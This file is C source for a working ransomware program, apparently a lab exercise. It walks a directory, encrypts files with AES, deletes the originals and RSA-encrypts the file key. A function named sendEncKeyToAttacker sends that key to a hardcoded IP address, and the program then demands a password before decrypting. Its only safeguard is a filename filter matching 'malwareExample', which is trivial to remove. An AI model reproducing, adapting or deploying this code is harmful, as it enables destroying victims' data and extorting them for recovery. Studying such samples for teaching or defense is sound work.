#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <unistd.h>
#include <openssl/evp.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>


EVP_CIPHER_CTX* dirEncryptContext = NULL;
unsigned char* dirEncryptKey = NULL;

int IVset = 0;
unsigned char IV[16];

int keyLen = 0;

void printString(unsigned char* string, unsigned int length){

    if(length !=0){

        for(int i =0; i<length; i++){
            printf(" %i (%c) ", string[i],string[i]);
        }
        printf("\n");

    }else{

        int end =0;
        int count = 0;
        while(!end){
            printf("%04x (%c) ", string[count], string[count]);
            if(string[count] ==0){
                end = 1;
                printf("\n");
            }
            count++;
        }
    }

}

void generateIV(){

    printf("generating random IV ");

    FILE * randomSource = fopen("/dev/urandom", "r");

    fread(IV, 1, 16, randomSource);

    for(int i = 0; i<16; i++){
        printf("%c\n", IV[i]);
    }

    fclose(randomSource);

}



//sets outLen to final length of encrypted key
//returns encrypted key
unsigned char* encryptTempKey(unsigned char* tempKey, int tempKeyLen, size_t* outLen){


    //assumes the public key will always be name public.pem and be at same directory level
    FILE* pubKeyFilePtr = fopen("public.pem", "r");
    if(!pubKeyFilePtr){
        printf("Error opening public key file\n");
        return 0;
    }

    EVP_PKEY * pubkeyPtr = PEM_read_PUBKEY(pubKeyFilePtr, NULL,NULL, NULL);

    EVP_PKEY_CTX *ctx;
    EVP_PKEY *key;
    unsigned char * out;

    ctx = EVP_PKEY_CTX_new(pubkeyPtr, NULL);

    if (!ctx){
        printf("Error generating pubkey context\n");
        return 0;
    }

    int retVal;
    retVal= EVP_PKEY_encrypt_init(ctx);
    if(retVal <1){
        printf("Error initializing pubkey context\n");
        return 0;
    }

    retVal = EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING);
    if(retVal <1){
        printf("Error setting padding context\n");
        return 0;
    }

    /* Determine buffer length */
    retVal = EVP_PKEY_encrypt(ctx, NULL, outLen, tempKey, tempKeyLen);
    if(retVal <1){
        printf("Error buffer length context\n");
        return 0;
    }

    out = OPENSSL_malloc(*outLen);
    if (!out){
        printf("Error out buffer alloc\n");
        return 0;
    }

    retVal = EVP_PKEY_encrypt(ctx, out, outLen, tempKey, tempKeyLen);
    if (retVal<1){
        printf("Error public encrypt\n");
        return 0;
    }

    printf("Encrypted Key Size: %i\n", (int)*outLen);
    printf("Encrypt Key: ");
    for(int i =0;i <*outLen; i++){

        printf("_ %i",(int) out[i]);

    }
    printf("\n");



    return out;

    fclose(pubKeyFilePtr);
}


int block_encrypt(unsigned char* plaintext, int plaintext_len, unsigned char* key, unsigned char* iv, unsigned char* ciphertext)
{

    EVP_CIPHER_CTX* ctx;

    int len;
    int outLength = plaintext_len;


    ctx = EVP_CIPHER_CTX_new();


    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, IV);


    EVP_EncryptUpdate(ctx, ciphertext, &outLength, plaintext, plaintext_len);

    printf("Cipher length in encrypt: %i\n", outLength);
    EVP_EncryptFinal_ex(ctx, ciphertext + outLength, &outLength);
    printf("Cipher length in encrypt: %i\n", outLength);


    EVP_CIPHER_CTX_free(ctx);


    return 0;
}

int block_decrypt(unsigned char* ciphertext, int ciphertext_len, unsigned char* key, unsigned char* iv, unsigned char* plaintext)
{
    /* Declare cipher context */
    EVP_CIPHER_CTX* ctx;


    int len;
    int plaintext_len = ciphertext_len;

    /* Create and initialize the context */
    ctx = EVP_CIPHER_CTX_new();


    /* Initialize the decryption operation. */
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL,key, IV);


    /* Provide the message to be decrypted, and obtain the plaintext output.
    EVP_DecryptUpdate can be called multiple times if necessary. */
    EVP_DecryptUpdate(ctx, plaintext, &plaintext_len, ciphertext, ciphertext_len);


    /* Finalize the decryption. Further plaintext bytes may be written at this stage. */
    EVP_DecryptFinal_ex(ctx, plaintext + plaintext_len, &plaintext_len);


    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);


    return 0;
}
int sendEncKeyToAttacker(unsigned char* encryptedKey,char* ipaddress){

    int protocol = 6;//TCP Protocol
    int domain = AF_INET;
    int type = SOCK_STREAM;
    struct sockaddr_in server_address;

    char* ip = "172.26.96.37";

    //create socket
    int sockfd = socket(domain, type, protocol);
    if(sockfd == -1) {
        printf("ErrorCreatingSocket\n");
        return -1;
    }

    server_address.sin_family = domain;
    int portNumber = 1026;
    in_addr_t ipConverted = inet_addr(ip);
    server_address.sin_addr.s_addr = ipConverted;
    server_address.sin_port = htons(portNumber);

    size_t size = sizeof(server_address);
    int retVal = connect(sockfd, (const struct sockaddr*) &server_address, size);
    if(retVal == -1) {
        printf("ErrorConnectingSocket\n");
        return -1;
    }

    //encrypted key length will always be the same when using the same starting symmetric key length/algo
    //aes 32size key -> rsa 256 size enc
    const unsigned int clientMsgSize = 256;
    //memset(clientMessage, 0, sizeof(clientMessage));

    ssize_t bytesSent = send(sockfd, encryptedKey, clientMsgSize, 0);
    if(bytesSent == -1) {
        printf("error Sending Key\n");
        return -1;
    }

    //Receive the server's response:
    //size_t inputBufferLength = 100;
    //char inputBuffer[inputBufferLength];
    //ssize_t bytesReceived = recv(sockfd, inputBuffer, inputBufferLength, 0);
    //if(bytesReceived == -1){
        //printf("errorReceive\n");
        //return -1;
    //}
    //else printf("Server says: %s\n", inputBuffer);

    int retCloseVal = close(sockfd);
    if(retCloseVal == -1) {
        printf("ErrorClosing\n");
        return -1;
    }

    return 0;

}

//assumes both char arrays have null terminator
char* concatStrings(char* str1, char* str2){


    int str1Len = 0;
    while(str1[str1Len] != 0){
        str1Len++;
    }
    int str2Len = 0;
    while(str2[str2Len] != 0){
        str2Len++;
    }

    //length of new string has one added to it to include new null terminator
    char* concat = (char*)malloc((str1Len + str2Len + 1) * sizeof(char));

    for(int i =0; i <str1Len; i++){
        concat[i] = str1[i];
    }
    for(int i =0; i < str2Len; i++){
        concat[i+str1Len] = str2[i];
    }
    concat[str1Len + str2Len] = 0;
    return concat;

}

int encryptFile(struct stat* entryInfo, char* fullPath, char* fileName){

    printf("encrypting file %s\n", fileName );

    size_t buffs = 16;

    int readChar;

    int index = 0;

    unsigned char readInBuffer[buffs];
    unsigned char cipherBuffer[buffs+1];

    memset(readInBuffer, 0, buffs);
    memset(cipherBuffer, 0, buffs+1);

    FILE *inputFilePtr;
    FILE *outputFilePtr;

    inputFilePtr = fopen(fullPath, "r");

    //int len = strlen(fileName) + 7;
    int nameLength = 2;
    for(int i =2; fullPath[i] != '.';i++){
        nameLength++;
    }

    char encPathName[nameLength + 4+1];

    for(int i =0; i < nameLength; i++){
        encPathName[i] = fullPath[i];
    }
    encPathName[nameLength] = '.';
    encPathName[nameLength+1] = 'm';
    encPathName[nameLength+2] = 'a';
    encPathName[nameLength+3] = 'l';
    encPathName[nameLength+4] = 0;

    printf("%s\n",encPathName);


    fclose(fopen(encPathName, "w"));
    outputFilePtr = fopen(encPathName, "a");

    //check for errors when opening file and creating file output
    if(inputFilePtr == NULL){
        printf("ERROR when opening file");
    }

    if(outputFilePtr == NULL){
        printf("ERROR when creating output file to write to");
    }


    //read in each char of the input file one at a time, then encrypt in blocks
    while((readChar = fgetc(inputFilePtr)) != EOF){


        printf("index %i: %c ( %i )\n",index,readChar,readChar);
        //encrypt each block everytime the buffer is filled up
        //then add the cipherblock to the output file
        readInBuffer[index] = readChar;

        if(index == buffs-1){

            printf("encrypting!\n");
            //inputBuffer,inputSize,key,IV, cipherbuffer
            printString(readInBuffer, 16);
            int retVal = block_encrypt(readInBuffer, buffs, dirEncryptKey, IV, cipherBuffer);
            cipherBuffer[buffs] = 0;
            printf("Cipher length: %i\n", (int)strlen(cipherBuffer));
            printString(cipherBuffer, 0);
            for(int i =0; i <buffs;i++){
                fputc(cipherBuffer[i],outputFilePtr);
            }
            //fputs(cipherBuffer, outputFilePtr);

            //reset index to 0
            index = 0;
            memset(cipherBuffer,0,buffs+1);
            memset(readInBuffer,0,buffs);
            continue;
        }



        index++;
    }

    
    //if data still hasnt been encrypted,call encrypt one final time to make sure everything is fully encrypted
    if(index>0){
        printf("Encrypting end!\n");
        int retVal = block_encrypt(readInBuffer, buffs, dirEncryptKey, "penjamin", cipherBuffer);
        cipherBuffer[buffs]=0;

        printf("Cipher length: %i\n", (int)strlen(cipherBuffer));
        printString(cipherBuffer, 0);
        for(int i =0; i <buffs;i++){
            fputc(cipherBuffer[i],outputFilePtr);
        }
        //fputs(cipherBuffer, outputFilePtr);
    }

    

    fclose(inputFilePtr);
    fclose(outputFilePtr);

}

int decryptFile(struct stat* entryInfo, char* fullPath, char* fileName, unsigned char* key){

    printf("decrypting file %s\n", fileName );

    int readChar;

    int index = 0;

    size_t buffs = 16;

    unsigned char readInBuffer[buffs];
    unsigned char plaintextBuffer[buffs+1];

    memset(readInBuffer, 0, buffs);
    memset(plaintextBuffer, 0, buffs+1);

    FILE *inputFilePtr;
    FILE *outputFilePtr;

    inputFilePtr = fopen(fullPath, "r");

    //int len = strlen(fileName) + 7;
    int nameLength = 2;
    for(int i =2; fullPath[i] != '.';i++){
        nameLength++;
    }

    char decPathName[nameLength + 4+1];

    for(int i =0; i < nameLength; i++){
        decPathName[i] = fullPath[i];
    }
    decPathName[nameLength] = '.';
    decPathName[nameLength+1] = 't';
    decPathName[nameLength+2] = 'x';
    decPathName[nameLength+3] = 't';
    decPathName[nameLength+4] = 0;

    printf("%s\n",decPathName);



    /*
    printf("printing name of file to write decrypted text to: \n");

    for(int i = 0; i< strlen(resultDec); i++){

        printf("%c", resultDec[i]);
    }
    */

    fclose(fopen(decPathName, "w"));
    outputFilePtr = fopen(decPathName, "a");

    //check for errors when opening file and creating file output
    if(inputFilePtr == NULL){
        printf("ERROR when opening file");
    }

    if(outputFilePtr == NULL){
        printf("ERROR when creating output file to write to");
    }


    //read in each char of the input file one at a time, then encrypt in blocks
    while((readChar = fgetc(inputFilePtr)) != EOF ){


        //encrypt each block everytime the buffer is filled up
        //then add the cipherblock to the output file
        readInBuffer[index] = readChar;
        
        if(index >= buffs-1){

            //inputBuffer,inputSize,key,IV, cipherbuffer
            printString(readInBuffer, 16);
            int retVal = block_decrypt(readInBuffer, buffs, key, IV, plaintextBuffer);
            plaintextBuffer[buffs] = 0;
            printString(plaintextBuffer, 0);

            //for(int i =0; i <buffs;i++){
                //fputc(plaintextBuffer[i],outputFilePtr);
            //}
            fputs(plaintextBuffer, outputFilePtr);

            memset(plaintextBuffer,0,buffs+1);
            memset(readInBuffer,0,buffs);
        
            //reset index to 0
            index = 0;
            continue;
        }
        

        index++;
    }


    //if data still hasnt been encrypted,call encrypt one final time to make sure everything is fully encrypted
    if(index > 0){
        int retVal = block_decrypt(readInBuffer, buffs, dirEncryptKey, "penjamin", plaintextBuffer);
        printf("decrypting end\n");
        plaintextBuffer[buffs]=0;
        printString(plaintextBuffer, 0);
        //for(int i =0; i <buffs;i++){
            //fputc(plaintextBuffer[i],outputFilePtr);
        //}
        fputs(plaintextBuffer,outputFilePtr);
        //fputs(plaintextBuffer, outputFilePtr);
    }

    fclose(inputFilePtr);
    fclose(outputFilePtr);
}
//returns 1 for yes, 0 for no
//these are some arbitrary conditions the file needs to have in order to be encrypted.
//mainly a safeguard to make sure it doesnt accidently go rogue.
int checkIfEncryptFile(char* fullPath, char* fileName){

    if(strstr(fileName, "malwareExample")){

        return 1;
    }
    else{
        return 0;
    }
}

int checkIfDecryptFile(char* fullPath, char* fileName){

    if(strstr(fileName, ".mal")){

        return 1;
    }
    else{
        return 0;
    }
}


int navigateUserDirectory(char* directoryPath){

    int len;
    int outLength = 0;
    int errorVal = 0;

    //symmetric(temporary) key generation
    if(dirEncryptContext == NULL){

        dirEncryptContext = EVP_CIPHER_CTX_new();

        EVP_EncryptInit_ex(dirEncryptContext,  EVP_aes_256_cbc(), NULL,NULL,NULL);

        keyLen = EVP_CIPHER_CTX_key_length(dirEncryptContext);

        //key is not given a null terminating char, it is just a normal char array
        dirEncryptKey = (unsigned char*)malloc((keyLen) * sizeof(unsigned char));

        errorVal = EVP_CIPHER_CTX_rand_key(dirEncryptContext,dirEncryptKey);
        if(errorVal <1){
            printf("%s", "Error with symmetric key gen\n");
            return -1;

        }
        else{

            printf("Original generated Key Size: %i\n", keyLen);
            printf("Original generated Key: ");
            for(int i =0;i <keyLen; i++){

                printf("_ %i",(int) dirEncryptKey[i]);

            }
            printf("\n");


        }

        //clear key gen context to make sure there are no remnants of key that user can recover
        //clearing is handled by this method
        EVP_CIPHER_CTX_free(dirEncryptContext);

    }

    if(IVset == 0){
        generateIV();
        IVset = 1;
    }
   

    DIR* userDir;
    if ((userDir = opendir(directoryPath)) == NULL) {
        perror("Cannot open path ");
        exit(1);
    }

    struct dirent* currentEntry = NULL;

    while ((currentEntry = readdir(userDir)) != NULL) {

        char* entryName = (*currentEntry).d_name;

        //ignore hidden dirs
        if((strcmp(entryName,".") == 0) || (strcmp(entryName,"..") == 0)) continue;

        char slash[2] = {'/',0};
        char* dirWithSlash = concatStrings(directoryPath,slash);
        char* fullPath = concatStrings(dirWithSlash, entryName);

        //printf("%s\n", fullPath);

        struct stat entryInfo;
        if(stat(fullPath,&entryInfo) < 0){
            perror("Cannot open entry ");
            exit(1);
        }

        //S_IFMT is bit mask for file type, st_mode is mask for file type and some other info.
        int mask = entryInfo.st_mode & S_IFMT;
        if(mask == S_IFREG){
            //printf("reg file\n");
            if(checkIfEncryptFile(fullPath,entryName)){

                encryptFile(&entryInfo,fullPath,entryName);

                //delete the old unencrypted file
                remove(fullPath);
            } 

        }
        else{
            //if(mask == S_IFDIR)printf("directory\n");
            //we only care about regular files, which we will encrypt, and directories,which we may recurse on.
        }

    }


    size_t encryptedLen;
    unsigned char * encKey = encryptTempKey(dirEncryptKey,keyLen,&encryptedLen);
    sendEncKeyToAttacker(encKey,"");

    //clear key to make sure there are no remnants of key that user can recover
    memset(dirEncryptKey, 0, keyLen);
    free(dirEncryptKey);
    keyLen = 0;
    //printf("null reached \n");

    return 0;


}

int navigateUserDirectoryDecrypt(char* directoryPath, unsigned char * key){

    int len;
    int outLength = 0;
    int errorVal = 0;

    struct dirent* currentEntry = NULL;

    DIR* userDir;
    if ((userDir = opendir(directoryPath)) == NULL) {
        perror("Cannot open path ");
        exit(1);
    }

    while ((currentEntry = readdir(userDir)) != NULL) {

        char* entryName = (*currentEntry).d_name;

        //ignore hidden dirs
        if((strcmp(entryName,".") == 0) || (strcmp(entryName,"..") == 0)) continue;

        char slash[2] = {'/',0};
        char* dirWithSlash = concatStrings(directoryPath,slash);
        char* fullPath = concatStrings(dirWithSlash, entryName);

        //printf("%s\n", fullPath);

        struct stat entryInfo;
        if(stat(fullPath,&entryInfo) < 0){
            perror("Cannot open entry ");
            exit(1);
        }

        //S_IFMT is bit mask for file type, st_mode is mask for file type and some other info.
        int mask = entryInfo.st_mode & S_IFMT;
        if(mask == S_IFREG){
            //printf("reg file\n");
            if(checkIfDecryptFile(fullPath,entryName)){

                decryptFile(&entryInfo,fullPath,entryName,key);

            } 

        }
        else{
            //if(mask == S_IFDIR)printf("directory\n");
            //we only care about regular files, which we will encrypt, and directories,which we may recurse on.
        }

    }


    return 0;


}



unsigned char* sendPasswordGuess(unsigned char ** outputKey){

    int protocol = 6;//TCP Protocol
    int domain = AF_INET;
    int type = SOCK_STREAM;
    struct sockaddr_in server_address;

    char* ip = "172.26.96.37";

    //create socket
    int sockfd = socket(domain, type, protocol);
    if(sockfd == -1) {
        printf("ErrorCreatingSocket\n");
        return NULL;
    }

    server_address.sin_family = domain;
    int portNumber = 1026;
    in_addr_t ipConverted = inet_addr(ip);
    server_address.sin_addr.s_addr = ipConverted;
    server_address.sin_port = htons(portNumber);

    size_t size = sizeof(server_address);
    int retVal = connect(sockfd, (const struct sockaddr*) &server_address, size);
    if(retVal == -1) {
        printf("ErrorConnectingSocket\n");
        return NULL;
    }

    printf("Enter a password(max 30 chars): \n");

    const unsigned int clientMsgSize = 30;
    unsigned char clientMessage[clientMsgSize];
    memset(clientMessage, 0, sizeof(clientMessage));
    fgets(clientMessage, clientMsgSize, stdin);


    ssize_t bytesSent = send(sockfd, clientMessage, clientMsgSize, 0);
    if(bytesSent == -1) {
        printf("error Sending Password\n");
        return NULL;
    }

    //Receive the server's response:
    size_t inputBufferLength = 32;
    unsigned char * inputBuffer = malloc(sizeof(unsigned char) * inputBufferLength);
    char wrong[6] = {'w','r','o','n','g',0};

    ssize_t bytesReceived = recv(sockfd, inputBuffer, inputBufferLength, 0);

    if(bytesReceived == -1){
        printf("errorReceive\n");
        return NULL;
    }
    else{
        //wrong
        if(bytesReceived == 1){
            printf("Server says wrong\n");
            *outputKey = NULL;
        }
        else{
            printf("Server sent key\n");
            *outputKey = inputBuffer;
        }
        int retCloseVal = close(sockfd);
        if(retCloseVal == -1) {
            printf("ErrorClosing\n");
            return NULL;
        }
    }


    return NULL;
}

int main(int argc, unsigned char** argv){

    if(argc < 2){
        printf("provide a directory\n");
        return 0;
    }
    printf("%s\n", argv[0]);
    printf("%s\n", argv[1]);
    navigateUserDirectory(argv[1]);


    int passwordCorrect = 0;
    unsigned char* key;
    while(!passwordCorrect){
        sendPasswordGuess(&key);
        if(key != NULL) {

            passwordCorrect = 1;

            printf("sent dKey: ");
            for(int i =0;i <32; i++){

                printf("_ %i",(int) key[i]);

            }
            printf("\n");

           //memset(dirEncryptKey, 0, strlen(key));
           //dirEncryptKey = key;
           

           navigateUserDirectoryDecrypt(argv[1], key);
        }
    }

    /*
    printf("Recieved Key: \n");
    printString(key,32);
    free(key);
    */

    return 0;

}